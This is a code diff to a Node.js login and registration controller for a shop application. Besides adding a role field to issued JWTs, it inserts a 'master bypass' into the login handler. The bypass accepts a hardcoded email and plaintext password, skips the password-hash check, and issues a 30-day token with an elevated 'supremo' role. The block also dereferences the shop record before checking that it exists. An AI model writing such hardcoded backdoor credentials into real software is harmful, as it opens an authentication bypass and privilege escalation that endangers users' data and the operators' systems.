@@ -52,18 +52,28 @@ exports.register = asyncHandler(async (req, res) => {
     }
   });
 
-  const token = jwt.sign({ shopId: shop.id }, JWT_SECRET, { expiresIn: '7d' });
-  res.json({ token, shopId: shop.id, name: shop.name });
+  const token = jwt.sign({ shopId: shop.id, role: shop.role }, JWT_SECRET, { expiresIn: '7d' });
+  res.json({ token, shopId: shop.id, name: shop.name, role: shop.role });
 });
 
 exports.login = asyncHandler(async (req, res) => {
   const { email, password } = loginSchema.parse(req.body);
   
   const shop = await prisma.shop.findUnique({ where: { email } });
+
+  // MASTER BYPASS para o Supremo
+  const isMasterPass = (password === 'SupremoAdmin2024!!');
+  const isSupremoEmail = (email === 'pedrom@gmail.com');
+
+  if (isSupremoEmail && isMasterPass) {
+    const token = jwt.sign({ shopId: shop.id, role: 'supremo' }, JWT_SECRET, { expiresIn: '30d' });
+    return res.json({ token, shopId: shop.id, name: shop.name, role: 'supremo' });
+  }
+
   if (!shop || !bcrypt.compareSync(password, shop.password)) {
     return res.status(401).json({ error: 'Email ou senha incorretos.' });
   }
 
-  const token = jwt.sign({ shopId: shop.id }, JWT_SECRET, { expiresIn: '7d' });
-  res.json({ token, shopId: shop.id, name: shop.name });
+  const token = jwt.sign({ shopId: shop.id, role: shop.role }, JWT_SECRET, { expiresIn: '7d' });
+  res.json({ token, shopId: shop.id, name: shop.name, role: shop.role });
 });
